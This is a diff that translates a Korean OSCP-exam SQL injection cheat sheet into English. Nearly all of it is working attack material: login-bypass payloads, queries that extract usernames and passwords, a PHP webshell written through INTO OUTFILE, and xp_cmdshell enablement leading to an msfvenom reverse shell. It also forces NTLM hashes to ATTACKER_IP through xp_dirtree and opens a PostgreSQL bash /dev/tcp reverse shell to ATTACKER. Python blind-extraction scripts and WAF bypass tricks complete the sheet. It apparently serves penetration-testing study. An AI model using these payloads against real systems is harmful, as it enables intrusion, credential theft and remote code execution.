@@ -1,38 +1,38 @@
 ---
-title: "SQL 인젝션 (SQL Injection)"
+title: "SQL Injection"
 date: 2026-06-20
 weight: 40
 draft: false
 tags: ["oscp", "cheatsheet"]
-summary: "SQLmap 없이 수동으로 진행하는 SQL 인젝션 절차와 자주 쓰는 페이로드."
+summary: "Manual SQL injection workflow without SQLmap, plus frequently used payloads."
 ---
 
-OSCP 시험에서는 SQLmap 사용이 금지되어 있으므로 모든 SQL 인젝션을 수동으로 수행한다.
+The OSCP exam prohibits SQLmap, so perform all SQL injection manually.
 
-- 출처: https://heretek.dev/oscp-cheatsheet/sql-injection/ (Jean Romero) — 재구성
-- 변수: `$TARGET` = 공격 대상, `$ATTACKER` = 공격자(Kali) IP (본문의 `ATTACKER_IP`도 같은 의미)
+- Source: https://heretek.dev/oscp-cheatsheet/sql-injection/ (Jean Romero) — reconstructed
+- Variables: `$TARGET` = target host, `$ATTACKER` = attacker (Kali) IP (`ATTACKER_IP` in the body means the same thing)
 
-## 동작 원리
+## How it works
 
-앱은 사용자 입력을 SQL 쿼리에 그대로 붙여 넣는다. 로그인 폼에 `offsec`을 입력하면:
+The app pastes user input straight into the SQL query. If you enter `offsec` in the login form:
 
 ```sql
 SELECT username,password FROM users WHERE username='offsec' AND password='hashed_pass';
 ```
 
-`offsec'`처럼 따옴표를 하나 더 넣으면 쿼리가 깨지고 DB 에러가 발생한다. 쿼리를 제어할 수 있다는 뜻이다.
+Adding one more quote, like `offsec'`, breaks the query and produces a DB error. That means you can control the query.
 
-`offsec' or 1=1;-- -`를 입력하면 쿼리가 이렇게 바뀐다:
+If you enter `offsec' or 1=1;-- -`, the query changes to:
 
 ```sql
 SELECT username,password FROM users WHERE username='offsec' or 1=1;-- -' AND password='hashed_pass';
 ```
 
-`or 1=1`은 항상 참이고 `-- -`가 나머지를 주석 처리한다.
+`or 1=1` is always true, and `-- -` comments out the rest.
 
-## 1단계 — 인젝션 지점 찾기
+## Step 1 — Find the injection point
 
-wfuzz로 폼 필드에 알려진 SQLi 페이로드와 특수문자를 넣어 본다:
+Use wfuzz to send known SQLi payloads and special characters into form fields:
 
 ```bash
 wfuzz -c -z file,/usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt -d "username=FUZZ&password=bar" -u http://TARGET/login.php
@@ -40,7 +40,7 @@ wfuzz -c -z file,/usr/share/seclists/Fuzzing/special-chars.txt -d "username=FUZZ
 wfuzz -c -z file,/usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt -d "username=FUZZ&password=bar" -u http://TARGET/login.php -p "127.0.0.1:8080:HTTP"
 ```
 
-Burp Repeater에서 수동 테스트:
+Manual testing in Burp Repeater:
 
 ```text
 '
@@ -50,57 +50,57 @@ Burp Repeater에서 수동 테스트:
 ' or 1=1;-- -
 ```
 
-응답에서 볼 것:
+What to look for in responses:
 
-- DB 에러 메시지 → 에러 기반 SQLi
-- 로그인 성공 또는 페이지 내용 변화 → in-band SQLi (UNION 시도)
-- 변화 없음 → blind SQLi 테스트
+- DB error message → error-based SQLi
+- Successful login or change in page content → in-band SQLi (try UNION)
+- No change → test for blind SQLi
 
-## 2단계 — DBMS 식별
+## Step 2 — Identify the DBMS
 
-에러 메시지로 판별한다:
+Determine it from the error message:
 
 - `You have an error in your SQL syntax` → MySQL
 - `Unclosed quotation mark... Microsoft SQL Server` → MSSQL
 - `ERROR: syntax error at or near` → PostgreSQL
 
-주석 문법:
+Comment syntax:
 
-- MySQL: `-- -` 또는 `#` — 예: `' or 1=1-- -`
-- MSSQL: `--` — 예: `' or 1=1--`
-- PostgreSQL: `--` — 예: `' or 1=1--`
+- MySQL: `-- -` or `#` — e.g., `' or 1=1-- -`
+- MSSQL: `--` — e.g., `' or 1=1--`
+- PostgreSQL: `--` — e.g., `' or 1=1--`
 
-- MySQL은 `--` 뒤에 공백이 필요하다. `-- -`를 쓰면 확실하다. MSSQL/PostgreSQL은 `-`를 하나 더 붙일 필요가 없다.
-- URL 인코딩된 POST 데이터에서는 공백이 `+`가 된다. Burp에서는 `-- -`가 `--+-`로 쓰인다.
+- MySQL requires a space after `--`. Using `-- -` is safe. MSSQL/PostgreSQL don't need an extra `-`.
+- In URL-encoded POST data, spaces become `+`. In Burp, `-- -` is written as `--+-`.
 
-## 3단계 — 공격 방식 선택
+## Step 3 — Choose an attack method
 
-- 에러 기반: 에러 메시지가 페이지에 표시될 때 — 빠름
-- UNION 기반: 앱이 쿼리 결과를 페이지에 표시할 때 — 빠름
-- Stacked queries: `;`로 두 번째 구문 실행 (WAITFOR/SLEEP으로 확인) — MSSQL에서는 즉시 RCE로 연결 (빈출)
-- Boolean blind: 페이지는 변하지만 에러·데이터가 안 보일 때 — 느림
-- Time-based blind: 눈에 보이는 변화가 전혀 없을 때 — 가장 느림
+- Error-based: when error messages are shown on the page — fast
+- UNION-based: when the app displays query results on the page — fast
+- Stacked queries: run a second statement with `;` (verify with WAITFOR/SLEEP) — on MSSQL, leads straight to RCE (common)
+- Boolean blind: the page changes but no errors or data are visible — slow
+- Time-based blind: no visible change at all — slowest
 
-- MSSQL(IIS + ASP.NET + SqlClient)이면 stacked queries를 먼저 확인한다: `'; WAITFOR DELAY '0:0:5'--`. 동작하면 나머지는 건너뛰고 바로 xp_cmdshell로 간다.
+- If it's MSSQL (IIS + ASP.NET + SqlClient), check stacked queries first: `'; WAITFOR DELAY '0:0:5'--`. If it works, skip the rest and go straight to xp_cmdshell.
 
-공격 방식을 하나 정해 파고들기 전에 아래의 탐지 체크리스트를 전부 돌린다. 5분, 7개 테스트로 무엇이 통하는지 정확히 보인다.
+Before committing to one attack method, run all of the detection checklist below. In 5 minutes and 7 tests, it shows exactly what works.
 
-## SQLi 탐지 체크리스트 (공격 확정 전 7개 테스트 전부 실행)
+## SQLi detection checklist (run all 7 tests before committing to an attack)
 
-### 테스트 1 — 인젝션이 존재하는가
+### Test 1 — Does the injection exist?
 
-필드에 `'`를 넣는다. 앱이 깨지거나 에러를 보이거나 다르게 동작하는가?
+Enter `'` into the field. Does the app break, show an error, or behave differently?
 
-- 성공 → 인젝션 가능. 계속 진행.
-- 실패 → `"`, `\`, `1 OR 1=1`, `)` 시도. 아무것도 안 깨지면 인젝션 불가일 확률이 높다.
+- Success → injectable. Continue.
+- Failure → try `"`, `\`, `1 OR 1=1`, `)`. If nothing breaks, injection is probably not possible.
 
-### 테스트 2 — 인증 우회
+### Test 2 — Authentication bypass
 
-로그인이 되는가? 되면 끝.
+Can you log in? If yes, you're done.
 
-### 테스트 3 — 에러 기반 (테스트 1의 응답 확인)
+### Test 3 — Error-based (check the response from Test 1)
 
-`'` 테스트에서 페이지에 DB 에러 메시지가 보였는가? 보이면:
+Did the `'` test show a DB error message on the page? If so:
 
 ```text
 MySQL:  ' OR 1=1 IN (SELECT version())-- -
@@ -108,9 +108,9 @@ MSSQL:  ' AND 1=cast((SELECT DB_NAME()) AS int)--
 Postgres: ' AND 1=cast((SELECT version()) AS int)--
 ```
 
-에러 메시지에 버전이나 DB 이름이 담겨 나오면 에러 기반이 동작하는 것이다. 그것을 사용한다.
+If the error message reveals the version or DB name, error-based works. Use it.
 
-### 테스트 4 — UNION 기반
+### Test 4 — UNION-based
 
 ```sql
 ' ORDER BY 1-- -
@@ -118,28 +118,28 @@ Postgres: ' AND 1=cast((SELECT version()) AS int)--
 ' ORDER BY 10-- -
 ```
 
-컬럼 수를 찾고 placeholder로 UNION SELECT를 시도한다. ORDER BY는 되는데 UNION이 계속 실패하면 여기서 멈추고 테스트 5로 넘어간다.
+Find the column count and try UNION SELECT with placeholders. If ORDER BY works but UNION keeps failing, stop here and move on to Test 5.
 
-### 테스트 5 — Stacked queries (중요 — 특히 MSSQL)
+### Test 5 — Stacked queries (important — especially MSSQL)
 
 ```text
 MSSQL:  '; WAITFOR DELAY '0:0:5'--
-MySQL:  '; SELECT SLEEP(5)-- -       (PHP 앱에서는 대개 실패)
+MySQL:  '; SELECT SLEEP(5)-- -       (usually fails in PHP apps)
 Postgres: '; SELECT pg_sleep(5)--
 ```
 
-응답이 5초 늦어졌는가? stacked queries가 동작하는 것이다. MSSQL이면 데이터 추출을 건너뛰고 바로 xp_cmdshell로 간다.
+Did the response take 5 seconds longer? Stacked queries work. If it's MSSQL, skip data extraction and go straight to xp_cmdshell.
 
-### 테스트 6 — Boolean blind
+### Test 6 — Boolean blind
 
 ```text
 ' AND 1=1-- -     → page looks normal?
 ' AND 1=2-- -     → page looks different?
 ```
 
-두 페이지가 다르게 보이면 boolean blind가 동작한다. Python으로 스크립트화한다.
+If the two pages look different, boolean blind works. Script it with Python.
 
-### 테스트 7 — Time-based blind (최후 수단)
+### Test 7 — Time-based blind (last resort)
 
 ```text
 MySQL:  ' AND IF(1=1,SLEEP(5),0)-- -
@@ -147,20 +147,20 @@ MSSQL:  '; IF(1=1) WAITFOR DELAY '0:0:5'--     (this IS stacked queries — same
 Postgres: ' AND (SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END)--
 ```
 
-- MSSQL은 WAITFOR DELAY에 stacked queries가 필요하다. 테스트 5가 성공했으면 xp_cmdshell로 건너뛴다.
+- MSSQL needs stacked queries for WAITFOR DELAY. If Test 5 succeeded, skip ahead to xp_cmdshell.
 
-요약:
+Summary:
 
-- Auth bypass — 그냥 로그인되는지 — 즉시
-- Error-based — 에러 메시지로 데이터 반환 — 빠름
-- UNION — 페이지 본문으로 데이터 반환 — 빠름
-- Stacked queries — 별도 구문 실행 가능 (MSSQL은 RCE) — 즉시 RCE
-- Boolean blind — 페이지 변화 = true/false — 느림 (스크립트화)
-- Time-based blind — 응답 지연 = true/false — 가장 느림 (스크립트화)
+- Auth bypass — just check whether login works — immediate
+- Error-based — return data through error messages — fast
+- UNION — return data in the page body — fast
+- Stacked queries — execute separate statements (RCE on MSSQL) — immediate RCE
+- Boolean blind — page change = true/false — slow (script it)
+- Time-based blind — response delay = true/false — slowest (script it)
 
-## 인증 우회
+## Authentication bypass
 
-username 필드에 넣는다:
+Enter into the username field:
 
 ```sql
 offsec' or 1=1;-- -
@@ -173,7 +173,7 @@ admin'-- -
 " or 1=1-- -
 ```
 
-동작 원리:
+How it works:
 
 ```sql
 SELECT * FROM users WHERE username='offsec' or 1=1;-- -' AND password='...'
@@ -181,7 +181,7 @@ SELECT * FROM users WHERE username='offsec' or 1=1;-- -' AND password='...'
 --                                          always true  commented out
 ```
 
-## 에러 기반 SQLi
+## Error-based SQLi
 
 ```sql
 ' or 1=1 in (SELECT version())-- -
@@ -201,16 +201,16 @@ SELECT * FROM users WHERE username='offsec' or 1=1;-- -' AND password='...'
 ' AND extractvalue(1, concat(0x3a, (SELECT concat(username,';',password) FROM users LIMIT 0,1)))-- -
 ```
 
-`0x3a`는 `:`. `LIMIT 0,1`은 첫 행, `LIMIT 1,1`은 두 번째 행.
+`0x3a` is `:`. `LIMIT 0,1` is the first row, `LIMIT 1,1` is the second row.
 
-- extractvalue()는 약 32자에서 잘린다. 긴 데이터는 `SUBSTRING()`으로 나눠 읽는다:
+- extractvalue() truncates after about 32 characters. Read long data in chunks with `SUBSTRING()`:
 
 ```sql
 ' AND extractvalue(1, concat(0x3a, SUBSTRING((SELECT password FROM users LIMIT 0,1), 1, 30)))-- -
 ' AND extractvalue(1, concat(0x3a, SUBSTRING((SELECT password FROM users LIMIT 0,1), 31, 30)))-- -
 ```
 
-### MySQL — updatexml() (extractvalue가 막혔을 때)
+### MySQL — updatexml() (when extractvalue is blocked)
 
 ```sql
 ' AND updatexml(1, concat(0x3a, (SELECT version())), 1)-- -
@@ -228,7 +228,7 @@ SELECT * FROM users WHERE username='offsec' or 1=1;-- -' AND password='...'
 ' AND 1=cast((SELECT TOP 1 password FROM users) AS int)--
 ```
 
-MSSQL 다음 행 — LIMIT이 없으므로 `NOT IN` 사용:
+Next rows in MSSQL — there's no LIMIT, so use `NOT IN`:
 
 ```sql
 ' AND 1=cast((SELECT TOP 1 name FROM sysobjects WHERE xtype='U' AND name NOT IN ('users')) AS int)--
@@ -244,11 +244,11 @@ MSSQL 다음 행 — LIMIT이 없으므로 `NOT IN` 사용:
 ' AND 1=cast((SELECT username FROM users LIMIT 1) AS int)--
 ```
 
-다음 행은 `OFFSET 1`, `OFFSET 2` 식으로 추가한다.
+For the next row, add `OFFSET 1`, `OFFSET 2`, and so on.
 
-## UNION 기반 SQLi
+## UNION-based SQLi
 
-### 1단계 — 컬럼 수 찾기
+### Step 1 — Find the column count
 
 ```sql
 ' ORDER BY 1-- -
@@ -256,19 +256,19 @@ MSSQL 다음 행 — LIMIT이 없으므로 `NOT IN` 사용:
 ' ORDER BY 6-- -          (ERROR → only 5 columns)
 ```
 
-Burp에서는 `'+ORDER+BY+1--+-`.
+In Burp: `'+ORDER+BY+1--+-`.
 
-### 2단계 — 화면에 보이는 컬럼 찾기
+### Step 2 — Find the columns visible on the page
 
 ```sql
 ' UNION SELECT 'A1','B2','C3','D4','D5'-- -
 ```
 
-Burp에서는 `'+union+select+'A1','B2','C3','D4','D5'--+-`.
+In Burp: `'+union+select+'A1','B2','C3','D4','D5'--+-`.
 
-타입 에러가 나면 NULL을 사용한다: `' UNION SELECT NULL,'B2',NULL,NULL,NULL-- -`
+If you get a type error, use NULL: `' UNION SELECT NULL,'B2',NULL,NULL,NULL-- -`
 
-### 3단계 — 데이터 추출
+### Step 3 — Extract data
 
 MySQL:
 
@@ -279,7 +279,7 @@ MySQL:
 '+union+select+'A1',group_concat(username,'@@',password),'C3','D4','D5'+from+users--+-
 ```
 
-group_concat이 잘리면 한 행씩:
+If group_concat is truncated, go one row at a time:
 
 ```text
 '+union+select+'A1',concat(username,'@@',password),'C3','D4','D5'+from+users+LIMIT+0,1--+-
@@ -297,7 +297,7 @@ MSSQL:
 ' UNION SELECT NULL,username+':'+password,NULL,NULL,NULL FROM users--
 ```
 
-한 행씩 (MSSQL에는 LIMIT이 없다):
+One row at a time (MSSQL has no LIMIT):
 
 ```sql
 ' UNION SELECT TOP 1 NULL,username,NULL,NULL,NULL FROM users--
@@ -320,64 +320,64 @@ SQLite:
 ' UNION SELECT NULL,group_concat(username||':'||password,char(10)),NULL FROM users--
 ```
 
-## information_schema 치트시트
+## information_schema cheat sheet
 
-MySQL과 PostgreSQL:
+MySQL and PostgreSQL:
 
-- 모든 DB: `SELECT schema_name FROM information_schema.schemata`
-- 현재 DB의 테이블: `SELECT table_name FROM information_schema.tables WHERE table_schema=database()`
-- 테이블의 컬럼: `SELECT column_name FROM information_schema.columns WHERE table_name='users'`
-- 데이터 덤프: `SELECT group_concat(user,';',passwd SEPARATOR '\n\n') FROM users`
+- All DBs: `SELECT schema_name FROM information_schema.schemata`
+- Tables in the current DB: `SELECT table_name FROM information_schema.tables WHERE table_schema=database()`
+- Columns of a table: `SELECT column_name FROM information_schema.columns WHERE table_name='users'`
+- Dump data: `SELECT group_concat(user,';',passwd SEPARATOR '\n\n') FROM users`
 
-MSSQL (시스템 테이블이 다르다):
+MSSQL (system tables are different):
 
-- 모든 DB: `SELECT name FROM master..sysdatabases`
-- 테이블: `SELECT name FROM sysobjects WHERE xtype='U'`
-- 컬럼: `SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')`
+- All DBs: `SELECT name FROM master..sysdatabases`
+- Tables: `SELECT name FROM sysobjects WHERE xtype='U'`
+- Columns: `SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')`
 
-## SQLi → 파일 읽기 / 웹셸 (MySQL)
+## SQLi → file read / webshell (MySQL)
 
-파일 읽기:
+File read:
 
 ```sql
 ' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL,NULL,NULL-- -
 ' UNION SELECT NULL,LOAD_FILE('C:/xampp/htdocs/wp-config.php'),NULL,NULL,NULL-- -
 ```
 
-웹셸 쓰기:
+Webshell write:
 
 ```sql
 ' UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>',NULL,NULL,NULL INTO OUTFILE '/var/www/html/shell.php'-- -
 ' UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>',NULL,NULL,NULL INTO OUTFILE 'C:/xampp/htdocs/shell.php'-- -
 ```
 
-실행: `http://TARGET/shell.php?cmd=whoami`
+Execute: `http://TARGET/shell.php?cmd=whoami`
 
-- 실패 조건: 파일이 이미 존재하거나, FILE 권한이 없거나, `secure_file_priv`가 경로를 제한할 때.
+- Failure conditions: the file already exists, FILE privilege is missing, or `secure_file_priv` restricts the path.
 
 ## Stacked Queries — MSSQL RCE (xp_cmdshell)
 
-MSSQL은 `;`로 여러 구문을 실행할 수 있다. MySQL은 대부분의 PHP 앱에서 불가능하다.
+MSSQL can run multiple statements separated by `;`. MySQL can't in most PHP apps.
 
-탐지: `'; WAITFOR DELAY '0:0:5'--` → 5초 지연이면 stacked queries가 동작한다.
+Detection: `'; WAITFOR DELAY '0:0:5'--` → a 5-second delay means stacked queries work.
 
-1단계 — xp_cmdshell 활성화:
+Step 1 — enable xp_cmdshell:
 
 ```sql
 '; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--
 '; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
 ```
 
-2단계 — 명령 실행 (출력은 안 보인다):
+Step 2 — run commands (output is not shown):
 
 ```sql
 '; EXEC xp_cmdshell 'whoami';--
 ```
 
-ping으로 확인: `'; EXEC xp_cmdshell 'ping ATTACKER_IP';--`
-리스너: `sudo tcpdump -i tun0 icmp`
+Verify with ping: `'; EXEC xp_cmdshell 'ping ATTACKER_IP';--`
+Listener: `sudo tcpdump -i tun0 icmp`
 
-3단계 — 리버스 셸:
+Step 3 — reverse shell:
 
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f exe -o shell.exe
@@ -389,15 +389,15 @@ python3 -m http.server 80
 '; EXEC xp_cmdshell 'C:\Windows\Temp\shell.exe';--
 ```
 
-xp_cmdshell이 거부되면 — 해시 탈취:
+If xp_cmdshell is refused — steal the hash:
 
 ```sql
 '; EXEC master..xp_dirtree '\\ATTACKER_IP\share\';--
 ```
 
-잡기: `sudo responder -I tun0 -A` → 크랙은 `hashcat -m 5600`
+Catch it: `sudo responder -I tun0 -A` → crack with `hashcat -m 5600`
 
-Burp용 URL 인코딩:
+URL-encoding for Burp:
 
 ```text
 ';+EXEC+sp_configure+'show+advanced+options',1;+RECONFIGURE;--
@@ -413,13 +413,13 @@ Burp용 URL 인코딩:
 '; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"';--
 ```
 
-`superuser` 역할이 필요하다. psql에서 `\du`로 확인한다.
+Requires the `superuser` role. Check with `\du` in psql.
 
-## Blind SQLi — Boolean 기반
+## Blind SQLi — boolean-based
 
-확인: `offsec' or 1=1-- -` vs `offsec' or 1=2-- -` → 페이지가 서로 다른가?
+Confirm: `offsec' or 1=1-- -` vs `offsec' or 1=2-- -` → do the pages differ?
 
-한 글자씩 추출:
+Extract one character at a time:
 
 ```text
 offsec' AND substring(database(),1,1)='a'-- -     → FALSE
@@ -428,7 +428,7 @@ offsec' AND substring(database(),2,1)='f'-- -     → TRUE
 offsec' AND (SELECT substring(password,1,1) FROM users LIMIT 1)='a'-- -
 ```
 
-## Blind SQLi — Time 기반
+## Blind SQLi — time-based
 
 ```sql
 -- MySQL
@@ -443,9 +443,9 @@ offsec'; IF(SUBSTRING(DB_NAME(),1,1)='m') WAITFOR DELAY '0:0:5'--
 offsec'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
 ```
 
-## Blind SQLi — Python 스크립트 (SQLmap은 금지)
+## Blind SQLi — Python script (SQLmap is prohibited)
 
-Boolean 기반 추출기:
+Boolean-based extractor:
 
 ```text
 #!/usr/bin/env python3
@@ -472,7 +472,7 @@ for pos in range(1, 50):
         break
 ```
 
-Time 기반 추출기:
+Time-based extractor:
 
 ```text
 #!/usr/bin/env python3
@@ -504,13 +504,13 @@ for pos in range(1, 50):
         break
 ```
 
-DB별 time 페이로드:
+Time payloads per DB:
 
 - MySQL: `IF(condition,SLEEP(3),0)`
 - MSSQL: `IF(condition) WAITFOR DELAY '0:0:3'`
 - PostgreSQL: `CASE WHEN condition THEN pg_sleep(3) ELSE pg_sleep(0) END`
 
-## 필터 / WAF 우회
+## Filter / WAF bypass
 
 ```text
 -- Space blocked? Use comments
@@ -530,7 +530,7 @@ DB별 time 페이로드:
 %2527+or+1%253d1--+-
 ```
 
-## 빠른 참조 링크 (같은 폴더 문서)
+## Quick reference links (documents in this folder)
 
-- 전체 흐름 → [methodology.md](methodology.md)
-- 웹 공격 (디렉터리 브루트포싱·CMS·LFI·업로드 등) → [web-attacks.md](web-attacks.md)
+- Full workflow → [methodology.md](methodology.md)
+- Web attacks (directory brute forcing, CMS, LFI, uploads, etc.) → [web-attacks.md](web-attacks.md)
